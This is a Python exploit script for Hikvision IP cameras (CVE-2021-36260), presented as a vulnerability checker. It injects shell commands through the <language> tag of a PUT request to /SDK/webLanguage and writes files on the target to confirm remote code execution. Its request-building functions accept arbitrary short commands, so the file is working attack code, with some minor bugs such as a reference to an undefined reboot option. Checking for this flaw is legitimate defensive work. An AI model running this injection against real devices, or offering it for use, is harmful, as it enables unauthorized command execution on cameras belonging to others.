# Reference: https://watchfulip.github.io/2021/09/18/Hikvision-IP-Camera-Unauthenticated-RCE.html
# All credit to Watchful_IP
#!/usr/bin/env python3

"""
    CheckHKRCE.py --rhost 192.168.57.20 --rport 8080 --check
"""

import os
import argparse
import time

import requests
from requests import packages
from requests.packages import urllib3
from requests.packages.urllib3 import exceptions


class Http(object):
    def __init__(self, rhost, rport, proto, timeout=60):
        super(Http, self).__init__()

        self.rhost = rhost
        self.rport = rport
        self.proto = proto
        self.timeout = timeout

        self.remote = None
        self.uri = None
        
        requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)

        self.remote = requests.Session()

        self._init_uri()

        self.remote.headers.update({
            'Host': f'{self.rhost}:{self.rport}',
            'Accept': '*/*',
            'X-Requested-With': 'XMLHttpRequest',
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'Accept-Encoding': 'gzip, deflate',
            'Accept-Language': 'en-US,en;q=0.9,sv;q=0.8',
        })
    def send(self, url=None, query_args=None, timeout=5):
        if query_args:
            if len(query_args) > 22:
                print(f'[!] Error: Command "{query_args}" to long ({len(query_args)})')
                return None
        try:
            if url and not query_args:
                return self.get(url, timeout)
            else:
                data = self.put('/SDK/webLanguage', query_args, timeout)
        except requests.exceptions.ConnectionError:
            self.proto = 'https' if self.proto == 'http' else 'https'
            self._init_uri()
            try:
                if url and not query_args:
                    return self.get(url, timeout)
                else:
                    data = self.put('/SDK/webLanguage', query_args, timeout)
            except requests.exceptions.ConnectionError:
                return None
        except requests.exceptions.RequestException:
            return None
        except KeyboardInterrupt:
            return None
        if data.status_code == 302:
            redirect = data.headers.get('Location')
            self.uri = redirect[:redirect.rfind('/')]
            self._update_host()
            if url and not query_args:
                return self.get(url, timeout)
            else:
                data = self.put('/SDK/webLanguage', query_args, timeout)
        return data

    def _update_host(self):
        if not self.remote.headers.get('Host') == self.uri[self.uri.rfind('://') + 3:]:
            self.remote.headers.update({
                'Host': self.uri[self.uri.rfind('://') + 3:],
            })

    def _init_uri(self):
        self.uri = '{proto}://{rhost}:{rport}'.format(proto=self.proto, rhost=self.rhost, rport=str(self.rport))

    def put(self, url, query_args, timeout):
        """Command injection in the <language> tag"""
        query_args = '<?xml version="1.0" encoding="UTF-8"?>' \
                     f'<language>$({query_args})</language>'
        return self.remote.put(self.uri + url, data=query_args, verify=False, allow_redirects=False, timeout=timeout)

    def get(self, url, timeout):
        return self.remote.get(self.uri + url, verify=False, allow_redirects=False, timeout=timeout)


def check(remote, args):
    if args.noverify:
        print(f'[*] Not verifying remote "{args.rhost}:{args.rport}"')
        return True

    print(f'[*] Checking remote "{args.rhost}:{args.rport}"')

    data = remote.send(url='/', query_args=None)
    if data is None:
        print(f'[-] Cannot establish connection to "{args.rhost}:{args.rport}"')
        return None
    print('[i] ETag:', data.headers.get('ETag'))
    
    data = remote.send(query_args='echo "hacked">>ok')
    data = remote.send(query_args='cat ok >webLib/c')
    if data is None or data.status_code == 404:
        print(f'[-] "{args.rhost}:{args.rport}" do not looks like Hikvision')
        return False
    status_code = data.status_code

    data = remote.send(url='/c', query_args=None)
    if not data.status_code == 200:
        """We could not verify command injection"""
        if status_code == 500:
            print(f'[-] Could not verify if vulnerable (Code: {status_code})')
            if args.reboot:
                return check_reboot(remote, args)
        else:
            print(f'[+] Remote is not vulnerable (Code: {status_code})')
        return False

    print('[!] Remote is verified exploitable')
    return True

def main():
    print('[*] Hikvision CVE-2021-36260\n[*] Tuntin9x (2021)')

    parser = argparse.ArgumentParser()
    parser.add_argument('--rhost', required=True, type=str, default=None, help='Remote Target Address (IP/FQDN)')
    parser.add_argument('--rport', required=False, type=int, default=80, help='Remote Target Port')
    parser.add_argument('--check', required=False, default=False, action='store_true', help='Check if vulnerable')
    parser.add_argument(
        '--noverify', required=False, default=False, action='store_true', help='Do not verify if vulnerable'
    )
    parser.add_argument(
        '--proto', required=False, type=str, choices=['http', 'https'], default='http', help='Protocol used'
    )
    args = parser.parse_args()

    remote = Http(args.rhost, args.rport, args.proto)

    try:
        if args.check:
            check(remote, args)    
        else:
            parser.parse_args(['-h'])
    except KeyboardInterrupt:
        return False

if __name__ == '__main__':
    main()
            
